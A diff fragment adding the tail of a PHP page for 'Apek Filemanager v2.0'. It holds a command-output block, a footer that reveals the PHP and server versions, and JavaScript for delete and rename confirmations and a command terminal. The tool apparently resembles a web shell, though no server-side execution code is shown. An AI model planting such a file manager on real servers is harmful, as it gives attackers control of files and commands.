+        <div style="margin-top: 8px;"><?php echo nl2br(htmlspecialchars($output)); ?></div>
+    </div>
+    <?php endif; ?>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+    <p>Apek Filemanager v2.0 | Secure File Management System</p>
+    <p style="font-size: 11px;">PHP: <?php echo phpversion(); ?> | Server: <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?></p>
+</div>
+
+<script>
+// Loading overlay
+function showLoading() {
+    document.getElementById('loading').style.display = 'flex';
+    return true;
+}
+
+function hideLoading() {
+    document.getElementById('loading').style.display = 'none';
+}
+
+setTimeout(hideLoading, 5000);
+
+// Refresh page
+function refreshPage() {
+    showLoading();
+    window.location.reload();
+}
+
+// Confirm delete
+function confirmDelete(filename) {
+    return confirm(`âš ï¸ PERMANENT DELETE!\n\nAre you sure you want to delete "${filename}"?\n\nThis action cannot be undone!`);
+}
+
+// Confirm rename
+function confirmRename(form) {
+    const newName = form.rename_to.value.trim();
+    if (!newName) {
+        alert('New name cannot be empty!');
+        return false;
+    }
+    if (/[\/\\:*?"<>|]/.test(newName)) {
+        alert('Invalid characters in filename!');
+        return false;
+    }
+    return confirm(`Rename to "${newName}"?`);
+}
+
+// Terminal functions
+function insertCmd(cmd) {
+    document.getElementById('cmdInput').value = cmd;
+    document.getElementById('cmdInput').focus();
+}
+
+function clearTerminal() {
+    const output = document.querySelector('.terminal-output');
+    if (output) output.innerHTML = '';
+}
+
+// Keyboard shortcuts
+document.addEventListener('keydown', function(e) {
+    if ((e.ctrlKey || e.metaKey) && e.key === 's') {
+        const form = document.querySelector('form[method="post"] textarea');
+        if (form && form.closest('form')) {
+            e.preventDefault();
+            form.closest('form').submit();
+        }
+    }
+});
+
+// Auto hide messages
+setTimeout(() => {
+    document.querySelectorAll('.message').forEach(msg => {
+        msg.style.opacity = '0';
+        setTimeout(() => msg.remove(), 500);
+    });
+}, 5000);
+</script>
+
+</body>
+</html>
